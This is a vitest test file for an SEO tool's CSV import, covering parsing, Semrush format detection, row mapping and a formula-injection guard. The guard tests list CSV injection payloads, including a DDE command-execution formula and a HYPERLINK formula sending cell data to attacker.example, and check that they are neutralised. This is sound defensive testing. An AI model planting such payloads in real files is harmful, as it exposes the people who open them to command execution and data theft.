import { describe, expect, it } from "vitest";

import { parseCsv } from "@/lib/import/csv";
import {
  isFormulaLike,
  neutralizeForExport,
  toCsv,
  toCsvField,
} from "@/lib/import/formula-guard";
import { detectFormat, mapIntent, mapRow } from "@/lib/import/semrush";
import { validateUpload, checksumOf, MAX_IMPORT_BYTES } from "@/server/services/import";

describe("csv parsing", () => {
  it("reads a plain file", () => {
    const result = parseCsv("Keyword,Position\npayroll software,4\nhr software,11\n");

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.headers).toEqual(["Keyword", "Position"]);
    expect(result.rows).toEqual([
      { Keyword: "payroll software", Position: "4" },
      { Keyword: "hr software", Position: "11" },
    ]);
  });

  it("honours quoted fields containing commas, quotes and newlines", () => {
    const csv =
      'Keyword,Note\n"payroll, software","she said ""yes"""\n"multi\nline","ok"\n';
    const result = parseCsv(csv);

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.rows[0]).toEqual({
      Keyword: "payroll, software",
      Note: 'she said "yes"',
    });
    expect(result.rows[1]!.Keyword).toBe("multi\nline");
  });

  it("handles CRLF, which is what Semrush actually exports", () => {
    const result = parseCsv("Keyword,Position\r\npayroll,4\r\n");

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.rows).toHaveLength(1);
  });

  it("strips a byte-order mark rather than putting it in the first header", () => {
    const result = parseCsv("﻿Keyword,Position\npayroll,4\n");

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.headers[0]).toBe("Keyword");
  });

  it("skips blank spacing rows", () => {
    const result = parseCsv("Keyword,Position\npayroll,4\n\n,\nhr,9\n");

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.rows).toHaveLength(2);
  });

  it("pads a short row rather than misaligning the rest", () => {
    const result = parseCsv("Keyword,Position,URL\npayroll,4\n");

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.rows[0]).toEqual({ Keyword: "payroll", Position: "4", URL: "" });
  });

  it("refuses a file with no rows", () => {
    expect(parseCsv("").ok).toBe(false);
  });

  it("refuses more rows than the ceiling allows", () => {
    const body = Array.from({ length: 12 }, (_, index) => `kw${index},1`).join("\n");
    const result = parseCsv(`Keyword,Position\n${body}\n`, 10);

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe("too_many_rows");
  });
});

/**
 * CSV formula injection. SEO OS never evaluates a cell, so an imported payload is
 * inert while it is stored — the risk is on the way out, when somebody opens an
 * export in Excel.
 */
describe("formula injection", () => {
  const payloads = [
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://attacker.example/"&A1,"click")',
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=1+1",
  ];

  it("recognises every executable prefix", () => {
    for (const payload of payloads) {
      expect(isFormulaLike(payload)).toBe(true);
    }
  });

  it("neutralises them on export", () => {
    for (const payload of payloads) {
      const exported = neutralizeForExport(payload);

      expect(exported.startsWith("'")).toBe(true);
      // The original is still recoverable; this is escaping, not deletion.
      expect(exported.slice(1)).toBe(payload);
    }
  });

  it("leaves ordinary values alone", () => {
    for (const value of ["payroll software", "4", "https://example.com/a", ""]) {
      expect(neutralizeForExport(value)).toBe(value);
    }
  });

  it("quotes and escapes fields that need it", () => {
    expect(toCsvField('a,b')).toBe('"a,b"');
    expect(toCsvField('say "hi"')).toBe('"say ""hi"""');
    expect(toCsvField("=1+1")).toBe("'=1+1");
  });

  it("produces a file whose every cell is inert", () => {
    const csv = toCsv(
      ["Keyword", "Note"],
      [{ Keyword: "=cmd|'/c calc'!A1", Note: "fine" }],
    );

    // Reading it back must not yield a live formula in the first position.
    const parsed = parseCsv(csv);
    expect(parsed.ok).toBe(true);
    if (parsed.ok) expect(isFormulaLike(parsed.rows[0]!.Keyword!)).toBe(false);
  });
});

describe("upload validation", () => {
  it("accepts a csv", () => {
    expect(validateUpload("positions.csv", 1024).ok).toBe(true);
  });

  it("refuses by extension, not by claimed content type", () => {
    for (const name of ["payload.exe", "sheet.xlsx", "archive.zip", "notes.pdf"]) {
      const result = validateUpload(name, 1024);
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.code).toBe("unsupported_type");
    }
  });

  it("refuses an empty or oversized file", () => {
    expect(validateUpload("a.csv", 0).ok).toBe(false);
    expect(validateUpload("a.csv", MAX_IMPORT_BYTES + 1).ok).toBe(false);
  });

  it("gives the same file the same checksum", () => {
    expect(checksumOf("Keyword,Position\na,1\n")).toBe(checksumOf("Keyword,Position\na,1\n"));
    expect(checksumOf("a")).not.toBe(checksumOf("b"));
  });
});

describe("format detection", () => {
  it("recognises a Semrush positions export", () => {
    const detected = detectFormat([
      "Keyword",
      "Position",
      "Previous position",
      "Search Volume",
      "Keyword Difficulty",
      "URL",
      "Timestamp",
    ]);

    expect(detected?.source).toBe("SEMRUSH_POSITIONS");
    expect(detected?.confidence).toBeGreaterThan(0.9);
  });

  it("prefers the competitor format when a domain column is present", () => {
    // A competitor export is a positions export plus a domain, so the more
    // specific format has to win or every competitor row would be filed as ours.
    const detected = detectFormat(["Keyword", "Position", "URL", "Domain"]);
    expect(detected?.source).toBe("SEMRUSH_COMPETITORS");
  });

  it("recognises a keyword overview export", () => {
    const detected = detectFormat(["Keyword", "Intent", "Volume", "Keyword Difficulty", "CPC"]);
    expect(detected?.source).toBe("SEMRUSH_KEYWORD_OVERVIEW");
  });

  it("falls back to a plain keyword list", () => {
    expect(detectFormat(["Keyword"])?.source).toBe("MANUAL_CSV");
  });

  it("returns nothing for a file with no keyword column", () => {
    expect(detectFormat(["Date", "Sessions", "Users"])).toBeNull();
  });

  it("is case- and spelling-tolerant across export versions", () => {
    expect(detectFormat(["keyword", "current position", "landing page"])?.source).toBe(
      "SEMRUSH_POSITIONS",
    );
  });
});

describe("row mapping", () => {
  const headers = [
    "Keyword",
    "Position",
    "Previous position",
    "Search Volume",
    "Keyword Difficulty",
    "CPC",
    "URL",
    "Keyword Intents",
    "Timestamp",
  ];

  const options = { headers, language: "en", market: "PH", fallbackCapturedAt: "2026-09-01" };

  it("maps a well-formed row", () => {
    const result = mapRow(
      {
        Keyword: "Payroll Software Philippines",
        Position: "11",
        "Previous position": "14",
        "Search Volume": "2,400",
        "Keyword Difficulty": "43",
        CPC: "3.20",
        URL: "https://example.com/payroll-guide/",
        "Keyword Intents": "Commercial",
        Timestamp: "2026-08-30",
      },
      options,
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    expect(result.value.normalizedKeyword).toBe("payroll software philippines");
    expect(result.value.position).toBe(11);
    expect(result.value.previousPosition).toBe(14);
    // Thousands separators are normal in an export and must not become 2.
    expect(result.value.searchVolume).toBe(2400);
    expect(result.value.capturedAt).toBe("2026-08-30");
  });

  it("leaves an absent metric null rather than zero", () => {
    const result = mapRow(
      { Keyword: "payroll", Position: "4", "Search Volume": "", "Keyword Difficulty": "n/a" },
      options,
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;

    // A zero would be a measurement nobody took.
    expect(result.value.searchVolume).toBeNull();
    expect(result.value.keywordDifficulty).toBeNull();
  });

  it("rejects a row rather than repairing it", () => {
    const cases: [Record<string, string>, string][] = [
      [{ Keyword: "", Position: "4" }, "keyword_empty"],
      [{ Keyword: "payroll", Position: "0" }, "position_out_of_range"],
      [{ Keyword: "payroll", Position: "4000" }, "position_out_of_range"],
      [{ Keyword: "payroll", "Keyword Difficulty": "150" }, "difficulty_out_of_range"],
      [{ Keyword: "payroll", URL: "not a url" }, "url_invalid"],
    ];

    for (const [row, reason] of cases) {
      const result = mapRow(row, options);
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.reason).toBe(reason);
    }
  });

  it("stores a formula payload as the text it was", () => {
    // Inert here by construction, and not mangled on the way in either: the
    // stored value has to be what the file actually said.
    const result = mapRow({ Keyword: "=cmd|'/c calc'!A1", Position: "4" }, options);

    expect(result.ok).toBe(true);
    if (result.ok) expect(result.value.keyword).toBe("=cmd|'/c calc'!A1");
  });

  it("falls back to the import date when the export carries none", () => {
    const result = mapRow({ Keyword: "payroll", Position: "4" }, options);
    expect(result.ok && result.value.capturedAt).toBe("2026-09-01");
  });
});

describe("intent mapping", () => {
  it("maps the labels Semrush uses", () => {
    expect(mapIntent("Commercial")).toBe("COMMERCIAL");
    expect(mapIntent("transactional")).toBe("TRANSACTIONAL");
    expect(mapIntent("I")).toBe("INFORMATIONAL");
  });

  it("calls two intents MIXED rather than picking one", () => {
    expect(mapIntent("Commercial, Informational")).toBe("MIXED");
  });

  it("never guesses", () => {
    // An intent decides whether a keyword is commercially interesting, so an
    // invented one would quietly move an opportunity up the queue.
    expect(mapIntent("something else")).toBe("UNKNOWN");
    expect(mapIntent(null)).toBe("UNKNOWN");
    expect(mapIntent("")).toBe("UNKNOWN");
  });
});
